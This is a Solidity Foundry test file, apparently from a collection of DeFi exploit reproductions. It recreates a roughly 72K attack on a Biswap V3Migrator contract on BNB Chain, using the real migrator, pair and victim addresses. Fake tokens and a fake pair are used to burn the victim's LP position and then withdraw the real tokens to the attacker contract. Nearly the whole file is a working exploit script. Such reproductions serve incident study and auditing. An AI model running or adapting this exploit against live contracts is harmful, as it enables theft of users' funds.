// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~72K
// Attacker - https://bscscan.com/address/0xa1e31b29f94296fc85fac8739511360f279b1976
// Attack contract - https://bscscan.com/address/0x1d448e9661c5abfc732ea81330c6439b0aa449b5
// Attack Tx : https://bscscan.com/tx/0xebe5248820241d8de80bcf66f4f1bfaaca62962824efaaa662db84bd27f5e47e, https://bscscan.com/address/0xa1e31b29f94296fc85fac8739511360f279b1976

// @Analysis - https://twitter.com/MetaTrustAlert/status/1674814217122349056?s=20

interface V3Migrator {
    struct MigrateParams {
        address pair; // the Uniswap v2-compatible pair
        uint256 liquidityToMigrate; // expected to be balanceOf(msg.sender)
        address token0;
        address token1;
        uint16 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 amount0Min; // must be discounted by percentageToMigrate
        uint128 amount1Min; // must be discounted by percentageToMigrate
        address recipient;
        uint256 deadline;
        bool refundAsETH;
    }

    function migrate(MigrateParams calldata params) external returns (uint256 refund0, uint256 refund1);
}

interface IBiswapFactoryV3 {
    function newPool(address tokenX, address tokenY, uint16 fee, int24 currentPoint) external returns (address);
}

contract SimpleERC20 {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract FakeToken is SimpleERC20 {
    uint256 token0Amount;
    uint256 token1Amount;

    constructor() SimpleERC20("fake", "fake") {
        _mint(msg.sender, 10_000e18 * 1e18);
    }
}

contract FakePair is SimpleERC20 {
    uint256 token0Amount;
    uint256 token1Amount;

    constructor() SimpleERC20("fakePair", "fakePair") {
        _mint(msg.sender, 10_000e18 * 1e18);
    }

    function update(uint256 t0, uint256 t1) external {
        token0Amount = t0;
        token1Amount = t1;
    }

    function burn(address to) external returns (uint256, uint256) {
        return (token0Amount, token1Amount);
    }
}

contract ContractTest is Test {
    function setUp() public {
        // fork bsc
        uint256 forkId = vm.createFork("bsc", 29_554_461);
        vm.selectFork(forkId);
    }

    function testExploit() public {
        V3Migrator migrator = V3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);
        IUniswapV2Pair pairToMigrate = IUniswapV2Pair(0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85);
        address victimAddress = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;

        IBiswapFactoryV3 biswapV3 = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);
        //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator
        FakeToken fakeToken0 = new FakeToken();
        FakeToken fakeToken1 = new FakeToken();
        FakePair fakePair = new FakePair();
        biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);
        fakeToken0.transfer(address(migrator), 1e9 * 1e18);
        fakeToken1.transfer(address(migrator), 1e9 * 1e18);

        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);
        emit log_named_uint("liquidity to migrate", liquidityValue);
        IERC20 token0 = IERC20(pairToMigrate.token0());
        IERC20 token1 = IERC20(pairToMigrate.token1());
        assert(token0.balanceOf(address(this)) == 0);

        //1. Burn victim's LP token and add liquidity with fake tokens
        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(
            address(pairToMigrate),
            liquidityValue,
            address(fakeToken1),
            address(fakeToken0),
            150,
            10_000,
            20_000,
            0,
            0,
            victimAddress,
            block.timestamp + 1 minutes,
            false
        );
        migrator.migrate(params);

        uint256 token0Balance = token0.balanceOf(address(migrator));
        uint256 token1Balance = token1.balanceOf(address(migrator));
        fakePair.update(token0Balance, token1Balance);
        emit log_named_decimal_uint("this token0 before", token0.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("this token1 before", token1.balanceOf(address(this)), 18);

        //2. Steal tokens
        fakePair.transfer(address(this), 1e9 * 1e18);
        fakePair.approve(address(migrator), 1e9 * 1e18);
        V3Migrator.MigrateParams memory params2 = V3Migrator.MigrateParams(
            address(fakePair),
            liquidityValue,
            address(token0),
            address(token1),
            800,
            10_000,
            20_000,
            0,
            0,
            address(this),
            block.timestamp + 1 minutes,
            false
        );
        migrator.migrate(params2);

        assert(token0.balanceOf(address(this)) > 1e18);
        emit log_named_decimal_uint("this token0 after", token0.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("this token1 after", token1.balanceOf(address(this)), 18);
    }
}
